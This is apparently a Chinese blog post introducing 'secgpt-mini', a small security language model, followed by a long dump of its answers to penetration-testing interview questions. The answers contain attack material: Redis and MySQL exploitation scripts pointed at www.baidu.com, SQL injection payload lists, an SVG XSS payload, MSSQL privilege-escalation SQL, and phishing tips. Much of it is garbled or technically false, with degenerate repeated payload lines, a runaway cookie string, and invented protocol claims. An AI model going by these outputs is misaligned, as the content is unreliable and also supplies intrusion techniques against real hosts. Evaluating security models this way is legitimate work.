<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/D6E51jCK4KtZkvcxAAEU5w)

最近一直学习在炼丹，之前开源了 secgpt (https://github.com/Clouditera/secgpt) ，基于 13B 模型，收集了很多安全的数据集，但是训练一轮就需要 8*A100 一周以上。

最近发现在小模型上训练，尝试进行增量安全数据预训练，不仅耗时短，效果意想不到也挺好，降低参数后，这个模型也能跑在 CPU 上，大大增加了可玩性，可以让安全人员也能感受下网络安全大模型的魅力。

secgpt-mini 训练参数是 500M，喂入了大量安全数据，可以直接跑在没有 GPU 的环境上，我的 2018 款的 mac 都能跑起来，效果也不错，附件是输出的效果。

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FiadpA9fyZDo8YZY4hGUM1VJicuTtTrfwsjCiaSOhF26XcXcryzz3euu3lsVKkOBFial3X5YFStg22umQ/640?wx_fmt=png&from=appmsg)

采用 web 的形式进行指令交互，如何觉得答案好，可以选择 “选这个”，会自动生成用于 rlhf 的数据，可以作为后面进行 rlhf 训练时的数据。

模型使用方法：

1.  下载模型和源码 （公众号回复 “secgpt-mini”）
    
2.  安装 python3.7 和依赖 pip install -r requirements.txt
    
3.  运行 python3 webdemo.py --base_model models
    
4.  输入指令就可以了
    

训练方法：在知识星球中会讲述 secgpt-mini 是如何训练的，以及开源训练的无监督数据集和有监督数据集，评测方式等等。公众号回复 “知识星球” 加入星球。

让大模型做安全面试题
----------

一直在想如何安全模型的能力，一个方式是刷题，但是要准备很久题库，比较麻烦。

有一天在 GitHub 上看到网络安全类的面试题，想到如果就宏观看大模型的安全能力的话，让它做面试题就好了。

以下内容均为 SecGPT-Mini 输出，prompt 是

```
你是一名资深的网络安全专家，请你认真分析我的问题，并一步一步的给出答案。我的问题是:{question}


```

如果你是面试官，你给模型打几分？

微信公众号有字数限制，这里截取一部分，完整版和 secgpt-mini 源码放到一起了。  

> 问题 redis 未授权访问如何利用，利用的前提条件是?
> 
> Redis 是一个开源（BSD 许可）的使用 ANSI-C 语言编写、支持网络、可基于内存亦可持久化的日志型、键值（key-value）存储数据库，并提供多种编程语言 API。
> 
> 简单来说就是：数据可以存入 Redis 服务器中进行保存和读取，因为其性能极高且丰富的功能集被广泛应用于大型网站以及分布式应用系统等互联网领域
> 
> 一般情况下我们都是用 redis 来作为缓存来提高服务端请求的速度。如果对 redis 的权限控制不严格的话就很容易导致一些敏感信息泄露甚至进一步造成其他危害
> 
> ## 利用前提条件：
> 
> 1.redis 可以远程连接  
> 
> 2.redis 数据库设置为 saveallkeys on 或者没有开启过期时间限制或者开启了过期时间但是不存在过期的 key 。否则会报错
> 
> 3.redis 默认监听在 6379 端口上, 并且默认只允许本地访问，即绑定 ip 地址 127.0.0.1 或 localhost ，不允许外网访问
> 
> 4.redis 资源管理不当 (如未关闭) 导致 redis 远程命令执行漏洞存在，即通过发送特殊格式的数据包给目标 redis 实例达到任意代码执行的目的
> 
> 5.redis 没有安装防护软件, 比如云锁之类的。不然可能会拦截到异常流量，导致无法成功触发攻击
> 
> 6.redis 设置了密码的情况下，还需要知道该账号对应的密码才可以登录上去操作。
> 
> ** ** 注 ** ** 意：这里说的是未授权访问。不是说所有对外开放的 redis 都会出现这种情况 **
> 
> ## 具体步骤：
> 
> 1.redis 默认监听在 6379 端口上, 并且默认只允许本地访问, 即绑定 ip 地址 127.0.0.1 或 localhost , 不允许外网访问。
> 
> 所以需要伪造出类似这样的 IP 才能让 redis 对外网开放。
> 
> ```
> 
> http://xxx.xxx.xx.xxx/xxxxx/xx.php?host=xxx.xxx.xx.xxx&port=6379
> 
> ```
> 
> 这样就能绕过了防火墙的检测直接与 redis 建立链接，从而实现 redis 的未授权访问。
> 
> 那么接下来就需要考虑怎么去获取 redis 的配置文件的内容了？
> 
> 其实很简单，只需要将上面那个 URL 中的 xxx.xxx.xx.xxx 换成自己的域名即可，然后就可以看到 redis 的版本号啦~
> 
> 这时候再输入下面这个 url
> 
> ```
> 
> http://xxx.xxx.xx.xxx/?info#redis_version
> 
> ```
> 
> 就会返回当前 redis 的版本号，如下图所示：
> 
> ![](../Images/bb8eae9d2f42c4aee09cf082efacbcdb.png)
> 
> 根据版本号我们可以找到对应版本的官方文档，也可以自己下载一份 php 手册查看各个函数的参数，具体看下图吧~
> 
> 拿到版本后我们就应该开始尝试各种方法了，当然最常用的就是爆破法，先写个脚本看看能不能登陆进去吧！
> 
> ```
> 
> import requests,json,time
> 
> def main(host,port):
> 
>     url = 'http://%s:%s/%2523redis_version' % (host,port)
> 
>     while True:
> 
>         try:
> 
>             r=requests.get(url=url)
> 
>             print(r.text.strip())
> 
>             break;
> 
>         except Exception as e:
> 
>             time.sleep(1)
> 
> main('www.baidu.com',6379)
> 
> ```
> 
> ![](../Images/f6adbbba14fb2cd25bf2bdbe2df7ddfe.png)
> 
> 可以看到已经进入了 redis 里面了哦~~ 那是不是说明我们可以通过 get 方式传参的方式把 redis 里面的密钥都给打出来呢？让我们试试看吧！
> 
> ```python
> 
> payload='set foo"test"'
> 
> r=get_redis(host='www.baidu.com', port='6379')
> 
> print(r.execute_command("GET",payload))
> 
> ```
> 
> 结果如下：
> 
> ![](../Images/a7aa5a8af9596ce38bfcfca5eb1b2886.png)
> 
> 看来还是不行啊。。。。。那怎么办呢？
> 
> 答案当然是有的！！！
> 
> 继续翻阅 PHP 手册发现有个 eval() 函数可以直接运行用户提供的字符串内容。
> 
> 既然如此那就试一试呗！
> 
> 构造好要执行的语句后，在加上前面提到的 `%2523` 编码符号就行了~
> 
> 最后记得加一个单引号闭合一下语句。
> 
> 完整版脚本如下：
> 
> ```
> 
> from pocsuite3.lib.utils import get_cmd_output,get_md5
> 
> import sys
> 
> if len(sys.argv)==3:
> 
>     host=sys.argv[1]
> 
>     port=int(sys.argv[2])
> 
> else:
> 
>     raise ValueError('Usage: python exploit.py <target> <port>')
> 
> payload="\"".join(['','/*','*/','echo','md5(getenv(\'PATH\'))','*/'])
> 
> print payload+"''"
> 
> r=get_redis(host,'6379')
> 
> result=r.eval(payload)
> 
> print result['result']
> 
> ```
> 
> ![](../Images/c5344319117a7fd4ea49dc82eab0f63b.png)
> 
> 可以看到我们的目标路径已经被打印出来了。
> 
>   3%|██                                                             | 3/93 [03:45<2:12:07, 88.08s/it]
> 
> 问题 mysql 提权方式有哪些? 利用条件是什么? 
> 
> 先说一下 mysql 服务器上默认安装了哪些组件，这些组件可以用来做权限提升：
> 
> 1、phpmyadmin
> 
> 2、MySQL Server Manager（Mysqld）
> 
> 3、MySQL Client Libraries (libmysqld)
> 
> 4、Server Status Plugin（status）和 Server Performance Plugin（performance_schema），这两个插件在 5.7 版本之后被移除了。
> 
> 5、Replication Master/Slave
> 
> 6、X Protocol
> 
> 以上是最重要的几个部分，其他的比如 `binlog` 文件也可以用于攻击，但不是重点。
> 
> ## 一、PHPMyAdmin 漏洞
> 
> PhpMyAdmin 是一款基于 Web 的 MySQL 数据库管理工具，其功能非常强大，支持多种语言编写，可运行于 Linux、Windows 等操作系统下，使用 PHP 及 SQL 进行开发，具有操作简单的特点，可用于对整个 MYSQL 中的数据的操作与维护工作。
> 
> 由于 PHPMyAdmin 本身存在很多安全缺陷，在搭建好环境后，直接访问即可爆出用户名密码明文登录后台界面，进一步可以通过上传文件执行任意命令获取 root 权限。
> 
> 参考文章：[【实战】浅析 pma 远程代码执行](https://www.cnblogs.com/daxin-ai/p/9801056.html)
> 
> 需要满足以下条件：
> 
> ```
> 
> 系统为 linux 且允许 httpd 用户读取配置文件 /etc/php.ini
> 
> ```
> 
> 对于不同的发行版有不同的解决方案，例如 Debian 系下的 Ubuntu、Kali Linux 以及 Raspbian:
> 
> ```bash
> 
> apt install php-mysqlnd libapache2-mod-php php-curl php-gd php-json php-zip php-bcmath php-exifread php-intl php-iconv php-xml php-simple xmlrpc php-pear php-xsl php-pecl-pgsql php-sqlite3 php-tidy php-soap php-mbstring php-ldap php-enchant php-snmp php-mcrypt php-gmagick php-imap php-libxml php-openssl php-recode php-dom php-fileinfo php-ftp php-readline php-mhash php-sockets php-mssql php-dba php-shmop php-pspell php-igbinary php-gd2 php-pear php-imagick php-memcache php-mingodb php-mailparse php-msgfilter php-mingdom sqlninja python-dev aptitude update && aptitude upgrade
> 
> ```
> 
> 或者手动编译安装最新稳定版本的 PHP(建议下载源码包自行编译) 并添加到 / etc/apache2/modules 目录中, 重启 Apache 服务使之生效.
> 
> 然后修改配置文件 / etc/apache2/sites-available/default.conf 增加如下内容以使 phpmyadmin 能够正常启动并监听来自本机的请求.
> 
> ```bash
> 
> <Directory "/var/www/html">
> 
>         Options Indexes FollowSymLinks Includes ExecCGI MultiViews
> 
>         AllowOverride None
> 
>         Require all granted
> 
> </Directory>
> 
> <VirtualHost *:80>
> 
>             DocumentRoot /var/www/html/
> 
>             <Directory /var/www/html/>
> 
>                     Options +ExecCGI -MultiViews
> 
>                     AddHandler cgi-script .cgi .pl .py .shtml .sh .scgi .fcgi
> 
>                     #AddHandler fastcgi_script .fcgi
> 
>                     AddType application/x-httpd-php .php .html .htm
> 
>                     AddEnvIf Request_URI "^/(?:index.php|robots\.txt)$" no-passenv="QUERY_STRING"
> 
>                     Order allow,deny
> 
>                     Allow from all
> 
>             </Directory>
> 
>     AliasMatch "^(.*\.(gif|jpg|jpeg|png|bmp|swf))$" !^/.svn/$}
> 
>                 RewriteEngine On
> 
>                 RewriteCond %{REQUEST_FILENAME} !-f [OR]
> 
>                 RewriteCond %{REQUEST_FILENAME} !-d [OR]
> 
>                 RewriteRule ^(.*)$ index.php?$1 [L,QSA] }
> 
> <FilesMatch ".+\.inc$">
> 
>             Order deny,allow
> 
>             Deny from all
> 
>             Satisfy Any
> 
>             SetOutputSourceAllow from this_server
> 
> </FilesMatch>
> 
>             ScriptAlias /cgi-bin/ "/usr/lib/cgi-bin/"
> 
>             <Directory "/usr/lib/cgi-bin">
> 
>                     DirectoryIndex index.cgi
> 
>                     Options +ExecCGI
> 
>                     AddHandler cgi-script .cgi .pl .py .shtml .sh .fcgi
> 
>             </Directory>
> 
>             ErrorLog ${APACHE_LOG_DIR}/error.log
> 
>             LogLevel warn
> 
>             CustomLog ${APACHE_LOG_DIR}/access_log common
> 
> </VirtualHost>
> 
> ```
> 
> ** 注意 **
> 
> 1. 如果你的 web 根目录不在 / var/www/html 的话，那么请把上面的 DocumentRoot 改为你自己的路径
> 
> 2. 现在你可以尝试访问 http://localhost/phpmyadmin 或者 http://your-ip/phpmyadmin 来检查是否正确安装成功
> 
> 接下来我们就可以通过浏览器来连接 phpmyadmin 了，输入正确的账号密码即可进入我们的数据库管理系统啦!
> 
> ![](../Images/c0c5eaa4aeeeb47cd782ae56ad0ef7bf.png)![](../Images/f926bbdd6154fd8734a6fb8cf6bfe34e.png)
> 
> > 注意：如果出现 “Access denied for user 'root'@'localhost'” 错误信息则表示无法从本地主机登陆，此时我们需要将 `require_once './libraries/config.default.inc.php';` 改为 `require_once '../config.default.inc.php';`，这样就绕过了这一步限制，然后再重新加载页面就能看到效果了！
> 
> 至此，我们就完成了第一步，通过 phpmyadmin 控制面板进入到我们的 mysql 数据库里，当然我们还可以用其它方法如 xshell 等等进行同样的操作，这里不再赘述。
> 
> ## 二、脚本注入漏洞
> 
> MySQL 官方推荐大家不要使用脚本注入的方式来进行渗透测试，因为这种方式会破坏用户的数据库结构，导致后续恢复起来比较麻烦，但是仍然有很多人喜欢使用这种手法，原因无他就是快！而且相对来说成功率比较高，所以今天我也给大家分享一些常用的 payload。
> 
> ### Payload 列表
> 
> #### SQLMAP
> 
> ```
> 
> SELECT CONCAT(user(),CHAR(10),user()) FROM mysql.user WHERE host='%' and length(password)=1;
> 
> ```
> 
> #### SqlSlammer
> 
> ```
> 
> select concat(username,char(10),username)from mysql.user where username=database();
> 
> ```
> 
> #### 常见的 payload 组合
> 
> ```
> 
> %23&db_name=%23union_all(select%20concat(md5(%23version()%23),md5(admin_user()),md5(passw0rd()))#)%23&host=localhost&port=&limit=-1
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd()#
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd()%
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd()%
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd()
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd())
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd())
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd())
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd())
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd(
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd())
> 
> %23&db_name=%23union_all(select%20concat(md5(version())),md5(admin_user()),md5(passw0rd()
> 
> %23&db_name=%23union_all(select%20concat(md5(version()\}\},md5(admin_user}),md5({passw0rd
> 
> %23&db_name=%23union_all(select%20concat(md5(version\}\\}\},md5(admin_user)),md5(\{\{passw0r
> 
> %23&db_name=%23union_all(select%20concat(md5(version\}\\}\},md5(admin_user)},md5(\{\{passw0r
> 
> %23&db_name=%23union_all(select%20concat(md5(version\}\}),md5(admin_user},md5(\{\{passw0r
> 
> %23&db_name=%23union_all(select%20concat(md5(version》),md5(admin_user),md5(\{\{passw0r
> 
> %23&db_)},md5(admin_user),md5(\{\\{\{passw0r
> 
> %23&db_name=%23union_all(select%20concat(md5(version)\}\},md5(admin_user),md5(\{\\{\{passw0r
> 
> %23&db_),md5(admin_user),md5(\{\{passw0r
> 
> %23&db_name=%23union_all
> 
>   4%|██▋                                                            | 4/93 [04:16<1:37:33, 65.77s/it]
> 
> 问题 windows+mysql，存在 sql 注入，但是机器无外网权限，可以利用吗? 
> 
> 1、在没有公网 IP 的情况下，如何连接到数据库？这个不是 SQL 注入的问题了，是网络环境配置的问题：2、即使有公网 ip，在不使用 3306 端口的情况下，是否还可以进行远程链接？当然可以！MySQL 默认监听所有可用地址（包括本地），也就是说它会监听除了 TCP/IP 之外的所有协议。例如通过 UDP 也可以访问 MySQL 服务；再比如可以通过 DNS 解析出一个主机名，然后用这个域名来访问 MySQL 服务器。这些都是可行的方法。所以只要知道目标数据库所在的服务器上有哪些开放的服务和接口，就可以找到一种方法去连接该数据库。举几个例子：（1）如果对方是一个云服务器，则可以在浏览器中输入它的公共 IP 地址，直接进入其控制台页面，查看是否有 SSH 登录入口或 Web 管理界面等，如果有则可以直接连上去操作；如果没有的话就看有没有其他的开放端口，如 80 端口，或者尝试 ping 一下看看能否获取响应信息等等。如果成功登陆之后发现无法执行任何命令也没关系——这时候其实已经进入了系统管理员模式，接下来只需要切换用户即可继续下一步工作。（当然最好还是能拿到 root 权限以便后续安装软件包时更加方便） （2）对于内网渗透而言最常用的就是 Nmap 扫描器工具箱，它可以对指定的目标主机发起一次完整的探测与枚举过程并输出结果报告文件供参考查阅。但前提是你得先了解清楚自己所处的位置以及要攻击的目标位置之间的物理拓扑结构才行。另外值得一提的是，当我们在局域网内部活动的时候通常都会遇到防火墙之类的安全限制措施从而导致我们不能够正常地访问外部资源或是被阻止了一些敏感功能的正常使用。这时就需要借助一些特殊手段绕过这些障碍才能达到目的啦~ 比较常见且有效率较高的一种方式就是采用代理技术实现跨平台通信传输数据以完成任务需求。这里推荐一款非常好用而且免费开源的小型 HTTP 代理程序 XProxyClient 作为演示实例给大家分享下具体步骤如下所示↓ 需要注意的一点是在实际环境中可能还会出现其他情况需要根据实际情况灵活变通处理哦~~ 总之要想顺利突破重重阻碍到达目的地就必须学会因地制宜因势利导顺势而为方能达到事半功倍的效果呢
> 
>   5%|███▍                                                           | 5/93 [04:46<1:17:16, 52.68s/it]
> 
> 问题 常用的信息收集手段有哪些，除去路径扫描，子域名爆破等常见手段，有什么猥琐的方法收集企业信息? 
> 
> 看到这个题目我想到了一个很经典的案例：美国某银行在招聘的时候曾经做过一次测试，主要考察应聘者对于信息安全的认知和了解程度。该银行要求所有申请人都要提交一份简历，其中有一项是 “请写出你认为自己最薄弱的安全环节”。结果有 50% 的人直接写上了自己的姓名、地址以及电话号码，还有不少人将邮箱账号、家庭成员情况甚至身份证号都列了出来。当然了，他们中有些人确实收到了这家银行的面试通知。但最后的结果却是令人瞠目结舌——所有的候选人全部被拒！那么这些看似无关紧要的小细节到底会对安全产生怎样的影响呢？其实从上面的例子我们不难看出，在日常生活中有很多人并不在意个人隐私泄露的问题，却不知道这样可能会给黑客带来可乘之机。假设你是黑客，现在想要获取目标企业的敏感数据，你会怎么做呢？如果你的技术实力足够强大，那么你可以通过各种方式对网络进行渗透并窃取服务器中的重要文件；但如果只是个菜鸡的话，那不妨试试利用社会工程学来达到目的吧~ 在这里我给大家介绍几种比较实用的社会工程学方法，希望可以帮助到大家更好地保护自身隐私哦~ 第一种就是使用搜索引擎搜索关键字（如公司名称 + 员工 / 经理名字）或者通过社交媒体平台查找相关信息。比如说你在百度上输入关键词“华为”，然后查看其官网主页上的联系电话或传真号码就能轻松找到对应人员联系方式啦~ 还有一种方法叫做“钓鱼网站” 攻击法。顾名思义，“鱼叉式网络钓鱼”的意思就是在互联网上传播虚假内容以诱使用户访问恶意网页从而实施诈骗活动的一种行为模式。（比如伪装成正规金融机构向用户提供贷款服务）。不过这种方法需要具备一定的编程技能才能实现效果最大化哟～ 最后一种则是基于邮件系统漏洞发起的欺骗性操作。由于很多组织内部使用的电子邮件客户端软件存在缺陷导致可以轻易绕过身份验证机制进而发送伪造消息欺骗收件人的功能特性。例如我们可以尝试用以下代码构造一封带有附件图片链接的邮件：
> 
>   6%|████                                                           | 6/93 [05:13<1:03:33, 43.83s/it]
> 
> 问题 SRC 挖掘与渗透测试的区别是什么，针对这两个不同的目标，实施过程中会有什么区别 
> 
> 首先简单介绍一下我：本人从事安全工作十多年，在多个行业做过安全顾问、高级安全工程师等工作；目前在某大型互联网公司负责集团级的安全体系建设和管理工作。
> 
> 这个问题要从几个方面来回答：
> 
> 1）SRC（Security Research Center, 安全研究实验室），一般是指对漏洞进行深入研究并提交给厂商修复的研究机构或个人组织。
> 
> 2）渗透测试（Penetration Testing, 简称 PT）是一种评估系统安全性的方式，通过模拟攻击者的行为以发现系统的潜在弱点及可能存在的风险点。
> 
> 那么 SRC 挖掘与渗透测试之间的区别主要体现在以下几个方面：
> 
> - 目标不同
> 
>   - SRC 的目标是研究已知或者未知的漏洞 / 缺陷及其利用方式，为供应商提供技术参考；
> 
>   - 渗透测试的目标是在指定时间内尽可能多地找到目标网络中的所有可被利用的漏洞，并向客户报告其严重程度以及影响范围等信息。
> 
> - 实施过程不同
> 
>   - 在 SRC 中通常采用自动化脚本 + 手动验证的方式来挖掘漏洞，如使用 OWASP ZAP、Burp Suite 等工具辅助完成扫描任务；而 PT 则更倾向于人工操作，需要具备丰富的知识储备和技术能力才能顺利完成任务。
> 
> - 范围不同
> 
>   - SRC 往往只关注特定产品或服务中存在的某些类型漏洞，例如 SQL 注入、XSS 跨站请求伪造等等；而 PT 则是全面地检测整个信息系统架构内的安全隐患，包括但不限于 Web 应用层、数据库服务器端口开放情况、操作系统版本号等相关配置参数等。
> 
> - 报告内容差异
> 
>   - SRC 提交的漏洞研究报告应该包含详细的技术细节描述如何绕过当前防御机制并且复现该漏洞；而 PT 则侧重于总结出一套完整的流程方法论以便更好地帮助客户解决问题同时提升整体防护水平。
> 
> 综上所述可以看出两者之间存在明显差别但又互相补充关系。作为安全从业人员我们需要根据实际情况灵活选择合适的方法来进行相关工作
> 
>   8%|████▋                                                          | 7/93 [05:55<1:02:00, 43.26s/it]
> 
> 问题 存储 xss 在纯内网的环境中，可以怎么利用？
> 
> 1、先说一下我之前是如何发现这个漏洞的
> 
>   * 在做渗透测试的时候，我发现某系统存在一个上传功能。
> 
>     - 这个功能是允许用户上传图片文件到服务器上并展示出来（显示图片地址）；
> 
>     - 我将一张带有恶意代码的图片通过该接口传入后台数据库中，并成功执行了命令；但是没有弹框提示或者有其他明显异常现象出现！所以我就想尝试能不能直接在前台页面中插入恶意代码从而进行攻击？
> 
> 2、接下来就是一系列的操作过程：
> 
>    * 将刚才获取到的图片路径和 ID 复制下来，在前端页面使用 img 标签引入进来查看是否能正常加载：发现无法正常访问该图片，返回 403 错误码（猜测应该是权限不足的原因），说明我们不能直接使用 img 标签去引用它。
> 
>    * 那么是不是可以在 URL 后面添加一些参数呢？于是我在 URL 后面加上了一些过滤器常见的字符比如 `?&%#` 等，还是不行。
> 
>    * 接着又试了一下把前面的内容都删掉只留下后面的数字部分作为链接，也是不可以的。
> 
>    * 然后我又想到可能是因为默认不允许跨域请求导致的，就试着在本地搭建了一个代理服务，然后用代理的方式对目标站点发起请求，结果依然失败。
> 
>    * 后来我想到了可能是由于图片格式不正确造成的，因为如果是 jpg/png/bmp 这类常见图片格式的话是可以被浏览器解析出来的，于是我尝试换一种图像类型，最后选择了 svg 格式，果然能够正常打开并且内容也能读取出来了。（此处省略一万字）
> 
> 3、既然可以通过这种方式拿到想要的数据，那么下一步就是要考虑如何构造 payload 来进行远程代码执行操作了。
> 
>    * 因为 svg 格式本身就是一个 xml 结构数据包，所以我首先想到了构造类似于 xxe 这样的可执行代码，然而尝试之后并没有成功，不知道是什么原因。
> 
>    * 其次我还想到了 js 代码注入的方法，毕竟 html5 也支持嵌套 script 脚本语句，但是一样没起作用…… 后来才意识到这是纯内网环境下的应用，即使能够在客户端运行某些特殊函数，也无法与外部网络通信啊。
> 
> 4、那有没有其他的办法呢？
> 
>    * 想到这里突然灵光一闪，如果我们可以自己定义一段特殊的 SVG 代码，让它包含 javascript 脚本语言的部分，并且这段代码能够被网页所识别，这样就能达到我们的目的了吧~（PS: 这里需要注意的是一定要保证代码中的闭合符号要完整匹配才能生效哦）。
> 
> ```php<svg/onload=alert(“XSS”></svg>```
> 
> 5、最后总结一下思路吧~
> 
> * 利用 svg 的特性结合 url 编码方式绕过各种安全限制条件得到有效载荷。<br>
> 
> * 使用 <img src="data:image/svg+xml;base64,PHNjcmlwdD48L3RleHQ+"> 这种形式写入图片信息即可完成 XSS 植入工作。
> 
> 以上就是我对这个问题的理解啦，希望对你有所帮助哈～
> 
>   9%|█████▌                                                           | 8/93 [06:11<49:03, 34.62s/it]
> 
> 问题 mssql 中，假设为 sa 权限，如何不通过 xp_cmdshell 执行系统命令 
> 
> 先说结论：直接用 sqlserver 自带的 cmd.exe 进程启动一个 powershell 脚本即可达到效果
> 
> ```
> 
> declare @c int,@p varchar(1024),@s sysname,@r nvarchar(max)
> 
> set @c=578639, @p='C:\Windows\System32\windowsPowerShell\v1.0\pwsh.exe',@s=N'\\192.168.100.142'
> 
> exec master..xp_cmdshell 'whoami /user'
> 
> select N'system','system';-- 查看当前用户是否是 administrator
> 
> if (@@@version like '%SQL Server%' and @@VERSION < 10) or (SELECT SERVERPROPERTY('IsHadr') = 1)-- 判断是否有 HA 环境且不是最新版本，则可使用以下方式获取管理员权限：
> 
> begin try
> 
>     exec sp_addsrvrolemember @s,N'db_owner'
> 
> end try begin catch 
> 
>     print CHAR(0x9)+CHAR(0xA)+'[!]'+CHAR(0x9)+CHAR(0xA)+(N'无法提升到数据库角色 db_owner');return end catch  
> 
> ```
> 
>  10%|██████                                                         | 9/93 [08:24<1:31:26, 65.31s/it]
> 
> 问题 假设某网站存在 waf，不考虑正面绕过的前提下，应该如何绕过 (分情况讨论 云 waf / 物理 waf) 
> 
> 我来答一下这个问题吧！假设该站点是使用了 nginx+lua 作为 web 服务器和防火墙, 那么可以尝试以下几种方式去绕过：（1）如果目标系统为 linux 平台且没有安装任何杀软的情况下 可以直接在本地构造如下 payload 进行请求：GET / HTTP/1.0 Host:localhost Accept:text/html,application/xhtml+xml,text/xml;q=0.9,image/webp,*/*;q=0.8 User-Agent:Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36 Content-Type:application/x-www-form-urlencoded Connection:close Upgrade-Insecure-Requests:1 Cookie:__cfduid=d2f2b9d8a7e2c73c437ebbbac48fddc251415068636; __gads=aflr%3D1%2Cfr%3Da%3F31%2C1393483345%3B1000000000%3B1%2Cgaon%3D1000000000%2C1000000000%3B1000000000%2C1%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C1000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%2C8000000000%8000000000%8000000000%8000000000%800000000%800000000%800000000%800000000%800000000%800000000%80000000%80000000%80000000%80000000%80000000%80000000%80000000%80000000%80000000%80000000%800000000%80000000%8000000%8000000%8000000%8000000%80000000%8000000%8000000%8000000%8000000%8000000%8000000
> 
>  11%|██████▋                                                       | 10/93 [08:52<1:14:29, 53.85s/it]
> 
> 问题 介绍一下自认为有趣的挖洞经历（或 CTF 经历）
> 
> 2017 年，刚入行不久，在某大型厂商实习的时候，参与了他们一个安全项目的测试工作。在拿到源码后发现项目存在一处 SQL 注入漏洞，但是当时并不清楚是存储型还是反射型。因为时间比较紧，所以没有进行深入研究和利用。在提交给开发人员之后，得到回复说这个点已经修复过了，然后就去忙别的事情去了…… 结果几天以后收到开发人员发来的邮件：“您好，我们这边刚刚确认了一下您提到的那个 SQL 注入点，虽然确实已经被修补好了，但是一直有被绕过的情况发生。” 然而我并没有意识到这是个大坑啊！于是又重新把代码看了一遍，突然灵光一现——哦对，这里有个 POST 参数叫 “file” 可以控制输入内容的位置。而且从语法上来看应该是个可控变量吧？那就试试呗～ 果然不出所料，用 burp 改包成功执行命令啦~ 比较有趣的是，当时测试环境是在一台 linux 虚拟机上面运行着 nginx+php-fpm 服务，后来通过 ssh 连上去看日志文件才发现，原来攻击者上传了一个 bash 脚本并执行了它。。。而且更巧的是，由于该系统部署在网络设备内部网络中，因此除了能够获取到数据库中的数据之外还能直接操作内网主机上的各种资源，比如读取 / 写入 / etc/passwd、/etc/shadow 等敏感信息，甚至还可以远程连接其他机器等等… 当时真的觉得太刺激了！不仅如此，还发现了另外几个有意思的地方：（1）登录页面未验证 referer 来源；（2）部分业务逻辑使用正则表达式匹配字符串导致 sql 语句拼接错误，造成注入失败；（3）前端框架版本低，可越权查看用户密码明文哈希值；（4）本地化语言库包含大量中文字符，可以通过 unicode 编码构造 payload 实现任意函数调用；……………… 打完收工~
> 
>  12%|███████▎                                                      | 11/93 [09:27<1:05:44, 48.10s/it]
> 
> 问题 CSRF 的成因及防御措施（不用 token 如何解决) 
> 
> CSRF 攻击是一种常见的网络钓鱼和欺诈技术，它利用用户在访问网站时已经登录的身份进行恶意操作。
> 
> CSRF 的全称是 Cross-Site Request Forgery，中文名称为 “跨站请求伪造”，其主要原因是浏览器不会对从其他域发起的表单提交请求做任何验证或检查，即使该请求是由受害者本人发出的。攻击者可以通过欺骗手段诱使用户点击链接或者打开恶意网页，在用户的不知情下执行某些非法的操作，如修改密码、发送邮件等。
> 
> 下面是一些可能触发 CSRF 攻击的情况：
> 
> 1. 当用户浏览一个页面并已登录某个网站后，如果该页面包含一个指向另一个域名下的表单元素，则当用户使用此页面时可能会受到 CSRF 的影响。
> 
> 2. 如果目标站点没有采取有效的安全防范措施来防止 CSRF 攻击，那么即使是合法用户也可能成为被攻击的目标。
> 
> 3. 用户通常会忽略来自非信任来源的内容，而这些内容往往会被用来作为 CSRF 洗脑工具的一部分。
> 
> 为了有效地保护网站免受 CSRF 攻击的影响，以下是一些建议性的解决方案:
> 
> 1. 使用 Token 验证机制：Token 是一种唯一且不可预测的数据结构，用于确保只有经过身份认证并且拥有有效令牌值的人才能完成特定操作。服务器会在响应中将生成的 Token 与客户端请求一起传输，然后将其保存在本地存储器中。每次需要执行敏感操作之前，都需要通过验证 Token 来确认是否属于当前用户。
> 
> 2. 添加验证码功能：对于一些重要的交互过程，例如更改个人资料信息、重置密码等，可以要求用户提供额外的安全码以增强安全性。这样做的好处在于增加了攻击者的难度，因为它们无法轻易地获取到正确的验证码数据。
> 
